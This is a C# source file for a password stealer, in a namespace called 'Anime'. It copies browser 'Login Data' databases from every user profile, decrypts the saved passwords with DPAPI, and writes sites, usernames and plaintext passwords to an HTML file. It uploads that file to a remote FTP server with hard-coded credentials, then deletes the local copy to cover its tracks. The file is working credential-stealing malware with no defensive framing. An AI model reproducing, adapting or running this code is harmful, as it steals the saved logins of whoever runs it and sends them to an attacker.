using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PasswordStealer;
using System.IO;
using System.Data;
using System.Data.SQLite;
using System.Reflection;
using System.Diagnostics;

namespace Anime
{
    class PasswordData
    {
        public static string[] FTP_PATHS = { PasswordStealer.Program.FTP_PATH + PasswordStealer.Program.PC_NAME, PasswordStealer.Program.Passwords, PasswordStealer.Program.SteamData_path };
        public static void StealPasswords()
        {
                for (int i = 0; i < FTP_PATHS.Length; i ++)
                {
                    WebRequest ftpRequest = WebRequest.Create(FTP_PATHS[i]);
                    ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
                    ftpRequest.Credentials = new NetworkCredential(PasswordStealer.Program.FTPLogin, PasswordStealer.Program.FTPPassword);
                    using (var resp = (FtpWebResponse)ftpRequest.GetResponse())
                    {
                        
                    }
                }
                for (int a = 0; a < PasswordStealer.Program.webBrowsers_Paths.Length; a++)
                {
                    for (int b = 0; b < PasswordStealer.Program.environment.Length; b++)
                    {
                        string path = @"C:\Users\" + PasswordStealer.Program.environment[b] + @"\AppData\" + PasswordStealer.Program.webBrowsers_Paths[a];
                        string directory = path + new Random().Next(1, 9999999) + @"\";
                        string db_way = directory + "Data";
                        string file_way = path + "Login Data";
                        Directory.CreateDirectory(directory);
                        if (File.Exists(file_way))
                        {
                            File.Copy(file_way, db_way);
                        }
                        if (File.Exists(db_way))
                        {
                                string filename = @"C:\Windows\file" + PasswordStealer.Program.webBrowsers[a] + ".html";
                                string db_field = "logins";
                                byte[] entropy = null;
                                string description;
                                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                                DataTable DB = new DataTable();
                                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                                {
                                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                                    adapter.Fill(DB);
                                    int rows = DB.Rows.Count;
                                    StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                                    for (int i = 0; i < rows; i++)
                                    {
                                        Writer.Write(i + 1 + ") ");
                                        Writer.WriteLine(DB.Rows[i][1] + "<br>");
                                        Writer.WriteLine(DB.Rows[i][3] + "<br>");
                                        byte[] byteArray = (byte[])DB.Rows[i][5];
                                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                                        string password = new UTF8Encoding(true).GetString(decrypted);
                                        Writer.WriteLine(password + "<br><br>");
                                        connect.Close();
                                    }
                                    Writer.Close();
                                }
                                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                                string namez = Path.GetFileName(codeBase);
                                string pathz = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
                                using (WebClient webClient = new WebClient())
                                {
                                    webClient.Credentials = (ICredentials)new NetworkCredential(PasswordStealer.Program.FTPLogin, PasswordStealer.Program.FTPPassword);
                                    webClient.UploadFile(PasswordStealer.Program.Passwords + PasswordStealer.Program.webBrowsers[a] + "file.html", "STOR", @"C:\Windows\file" + PasswordStealer.Program.webBrowsers[a] + ".html");
                                    File.Delete(@"C:\Windows\file" + PasswordStealer.Program.webBrowsers[a] + ".html");
                                }
                        }
                    }
                }
        }
    }
}
